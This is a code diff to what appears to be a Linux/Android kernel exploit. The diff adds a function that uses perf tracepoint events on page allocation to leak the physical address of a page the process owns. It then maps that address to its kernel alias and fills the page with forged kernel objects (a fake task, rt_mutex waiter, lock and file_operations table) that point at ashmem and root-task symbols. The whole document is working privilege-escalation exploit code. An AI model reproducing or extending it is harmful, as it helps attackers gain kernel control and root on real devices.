@@ -1,9 +1,15 @@
 #include "common.h"
 #include "kernelsnitch/kernelsnitch.h"
+#if defined(SHELL_PERF_PAGE_ORACLE) && SHELL_PERF_PAGE_ORACLE
+#include <linux/perf_event.h>
+#endif
 
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
+#if defined(SHELL_PERF_PAGE_ORACLE) && SHELL_PERF_PAGE_ORACLE
+static void *shell_page_mapping;
+#endif
 static int reclaim_sv[2] = {-1, -1};
 #if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
     APP_CONTROLLED_MM_GROUP_RECLAIM
@@ -1489,6 +1495,236 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   return 1;
 }
 
+#if defined(SHELL_PERF_PAGE_ORACLE) && SHELL_PERF_PAGE_ORACLE
+#define SHELL_PERF_RING_PAGES 8UL
+#define SHELL_PAGE_COUNT 3UL
+#define SHELL_FAKE_TASK_OFF 0x000UL
+#define SHELL_FOPS_OFF 0x900UL
+#define SHELL_LOCK_OFF 0xa00UL
+#define SHELL_WAITER_OFF 0xa40UL
+#define SHELL_SCRATCH_OFF 0xb00UL
+
+_Static_assert(SHELL_FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF +
+                   sizeof(uint64_t) <= SHELL_FOPS_OFF,
+               "shell fake task overlaps fops");
+_Static_assert(SHELL_FOPS_OFF + FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) <=
+                   SHELL_LOCK_OFF,
+               "shell fops overlaps lock");
+_Static_assert(SHELL_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
+                   SHELL_SCRATCH_OFF,
+               "shell waiter overlaps scratch");
+_Static_assert(SHELL_SCRATCH_OFF + 0x100 <= ROOT_UMH_WORK_OFF,
+               "shell scratch overlaps root work");
+
+static uint64_t shell_read_perf_id(void) {
+  char text[32];
+  int fd = SYSCHK(open(
+      "/sys/kernel/tracing/events/kmem/mm_page_alloc/id",
+      O_RDONLY | O_CLOEXEC));
+  ssize_t size = SYSCHK(read(fd, text, sizeof(text) - 1));
+  SYSCHK(close(fd));
+  text[size] = 0;
+  char *end = NULL;
+  errno = 0;
+  uint64_t id = strtoull(text, &end, 10);
+  if (errno || end == text || id == 0) {
+    pr_error("perf page invalid event id text=%s errno=%d\n", text, errno);
+    return 0;
+  }
+  return id;
+}
+
+static void shell_ring_copy(unsigned char *out, const unsigned char *ring,
+                            size_t ring_size, uint64_t offset, size_t size) {
+  size_t start = (size_t)(offset & (ring_size - 1));
+  size_t first = ring_size - start;
+  if (first > size) {
+    first = size;
+  }
+  memcpy(out, ring + start, first);
+  if (first < size) {
+    memcpy(out + first, ring, size - first);
+  }
+}
+
+static uint64_t shell_find_perf_pfn(struct perf_event_mmap_page *meta,
+                                    const unsigned char *ring,
+                                    uint64_t event_id) {
+  uint64_t head = __atomic_load_n(&meta->data_head, __ATOMIC_ACQUIRE);
+  uint64_t tail = meta->data_tail;
+  uint64_t found_pfn = 0;
+  unsigned int matches = 0;
+  while (tail < head) {
+    struct perf_event_header header;
+    unsigned char record[256];
+    shell_ring_copy((unsigned char *)&header, ring, meta->data_size, tail,
+                    sizeof(header));
+    if (header.size < sizeof(header) || header.size > sizeof(record)) {
+      pr_error("perf page invalid record size=%u\n", header.size);
+      return 0;
+    }
+    shell_ring_copy(record, ring, meta->data_size, tail, header.size);
+    tail += header.size;
+    if (header.type != PERF_RECORD_SAMPLE || header.size < 40) {
+      continue;
+    }
+    uint32_t raw_size;
+    uint16_t raw_id;
+    int32_t raw_pid;
+    uint64_t pfn;
+    uint32_t order;
+    memcpy(&raw_size, record + 8, sizeof(raw_size));
+    memcpy(&raw_id, record + 12, sizeof(raw_id));
+    memcpy(&raw_pid, record + 16, sizeof(raw_pid));
+    memcpy(&pfn, record + 20, sizeof(pfn));
+    memcpy(&order, record + 28, sizeof(order));
+    if (raw_size < 28 || raw_size + 12 > header.size ||
+        raw_id != event_id || raw_pid != getpid()) {
+      continue;
+    }
+    if (order == 0) {
+      found_pfn = pfn;
+      matches++;
+    }
+  }
+  __atomic_store_n(&meta->data_tail, tail, __ATOMIC_RELEASE);
+  pr_info("perf page order0_events=%u pfn=%016llx\n",
+          matches, (unsigned long long)found_pfn);
+  if (matches != 1) {
+    return 0;
+  }
+  return found_pfn;
+}
+
+static uintptr_t prepare_shell_perf_page(int payload_mode) {
+  uint64_t event_id = shell_read_perf_id();
+  if (!event_id) {
+    return 0;
+  }
+  struct perf_event_attr attr;
+  memset(&attr, 0, sizeof(attr));
+  attr.type = PERF_TYPE_TRACEPOINT;
+  attr.size = sizeof(attr);
+  attr.config = event_id;
+  attr.sample_period = 1;
+  attr.sample_type = PERF_SAMPLE_RAW;
+  attr.wakeup_events = 1;
+  attr.disabled = 1;
+  attr.exclude_hv = 1;
+  int perf_fd = syscall(SYS_perf_event_open, &attr, 0, -1, -1,
+                        PERF_FLAG_FD_CLOEXEC);
+  if (perf_fd < 0) {
+    pr_error("perf page open failed event=%llu errno=%d\n",
+             (unsigned long long)event_id, errno);
+    return 0;
+  }
+  size_t map_size = PAGE_SIZE * (SHELL_PERF_RING_PAGES + 1);
+  unsigned char *perf_map = mmap(NULL, map_size, PROT_READ | PROT_WRITE,
+                                 MAP_SHARED, perf_fd, 0);
+  if (perf_map == MAP_FAILED) {
+    pr_error("perf page ring mmap failed errno=%d\n", errno);
+    SYSCHK(close(perf_fd));
+    return 0;
+  }
+  unsigned char *pages = mmap(NULL, PAGE_SIZE * SHELL_PAGE_COUNT,
+                              PROT_READ | PROT_WRITE,
+                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (pages == MAP_FAILED) {
+    pr_error("perf page data mmap failed errno=%d\n", errno);
+    SYSCHK(munmap(perf_map, map_size));
+    SYSCHK(close(perf_fd));
+    return 0;
+  }
+  unsigned char *target = pages + PAGE_SIZE;
+  pages[0] = 0;
+  pages[PAGE_SIZE * 2] = 0;
+  SYSCHK(ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0));
+  SYSCHK(ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0));
+  *target = 0;
+  __atomic_thread_fence(__ATOMIC_SEQ_CST);
+  SYSCHK(ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0));
+  uint64_t pfn = shell_find_perf_pfn(
+      (struct perf_event_mmap_page *)perf_map, perf_map + PAGE_SIZE,
+      event_id);
+  SYSCHK(munmap(perf_map, map_size));
+  SYSCHK(close(perf_fd));
+  if (!pfn) {
+    pr_error("perf page expected exactly one order-0 allocation\n");
+    SYSCHK(munmap(pages, PAGE_SIZE * SHELL_PAGE_COUNT));
+    return 0;
+  }
+  uint64_t physical = pfn << PAGE_SHIFT;
+  if (physical < P0_PHYS_OFFSET) {
+    pr_error("perf page physical below offset physical=%016llx\n",
+             (unsigned long long)physical);
+    SYSCHK(munmap(pages, PAGE_SIZE * SHELL_PAGE_COUNT));
+    return 0;
+  }
+  uintptr_t alias = P0_PAGE_OFFSET | (physical - P0_PHYS_OFFSET);
+  memset(target, 0, PAGE_SIZE);
+  fake_fops = alias + SHELL_FOPS_OFF;
+  fake_lock = alias + SHELL_LOCK_OFF;
+  fake_w0 = alias + SHELL_WAITER_OFF;
+  fake_task = alias + SHELL_FAKE_TASK_OFF;
+  fake_parent = fake_fops;
+  fake_right = data_addr(ASHMEM_MISC_FOPS);
+  fake_left = 0;
+  binwrite_target = alias + SHELL_SCRATCH_OFF;
+  put32(target, SHELL_LOCK_OFF, 0);
+  put64(target, SHELL_LOCK_OFF + 0x08, fake_w0);
+  put64(target, SHELL_LOCK_OFF + 0x10, fake_w0);
+  put64(target, SHELL_LOCK_OFF + 0x18, fake_task | 1);
+  put_fake_waiter(target, SHELL_WAITER_OFF, 1, 0, 0,
+                  fake_fops, 0, data_addr(ASHMEM_MISC_FOPS),
+                  fake_task, fake_lock, FAKE_WAITER_PRIO);
+  put32(target, SHELL_FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
+  put32(target, SHELL_FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
+  put32(target, SHELL_FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF,
+        FAKE_TASK_PRIO);
+  put64(target, SHELL_FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF,
+        text_addr(ROOT_TASK_GROUP));
+  put32(target, SHELL_FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
+  put64(target, SHELL_FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
+  put64(target, SHELL_FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+  put64(target, SHELL_FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF,
+        text_addr(INIT_TASK));
+  put64(target, SHELL_FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+  put_fake_fops_table(target, SHELL_FOPS_OFF);
+  uint64_t built_fops_open = 0;
+  uint64_t built_waiter_lock = 0;
+  uint64_t built_lock_owner = 0;
+  memcpy(&built_fops_open,
+         target + SHELL_FOPS_OFF + FOPS_OPEN_OFF, sizeof(built_fops_open));
+  memcpy(&built_waiter_lock,
+         target + SHELL_WAITER_OFF + FAKE_WAITER_LOCK_OFF,
+         sizeof(built_waiter_lock));
+  memcpy(&built_lock_owner,
+         target + SHELL_LOCK_OFF + 0x18, sizeof(built_lock_owner));
+  if (built_fops_open != text_addr(ASHMEM_OPEN) ||
+      built_waiter_lock != fake_lock || built_lock_owner != (fake_task | 1)) {
+    pr_error("perf page payload self-check failed open=%016llx "
+             "waiter_lock=%016llx owner=%016llx\n",
+             (unsigned long long)built_fops_open,
+             (unsigned long long)built_waiter_lock,
+             (unsigned long long)built_lock_owner);
+    SYSCHK(munmap(pages, PAGE_SIZE * SHELL_PAGE_COUNT));
+    return 0;
+  }
+  if (mlock(target, PAGE_SIZE) != 0) {
+    pr_error("perf page mlock failed errno=%d\n", errno);
+    SYSCHK(munmap(pages, PAGE_SIZE * SHELL_PAGE_COUNT));
+    return 0;
+  }
+  shell_page_mapping = target;
+  pr_success("perf page ready event=%llu user=%p pfn=%016llx order=0 "
+             "physical=%016llx alias=%016zx lock=%016zx fops=%016zx\n",
+             (unsigned long long)event_id, shell_page_mapping,
+             (unsigned long long)pfn, (unsigned long long)physical,
+             alias, fake_lock, fake_fops);
+  return alias;
+}
+#endif
+
 #if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
     APP_CONTROLLED_MM_GROUP_RECLAIM
 static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
@@ -1592,6 +1828,9 @@ static void cleanup_failed_kernel_page(const char *reason) {
 #endif
 
 uintptr_t prepare_kernel_page(int payload_mode) {
+#if defined(SHELL_PERF_PAGE_ORACLE) && SHELL_PERF_PAGE_ORACLE
+  return prepare_shell_perf_page(payload_mode);
+#endif
 #if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
     APP_CONTROLLED_MM_GROUP_RECLAIM
   return prepare_controlled_kernel_page(payload_mode);
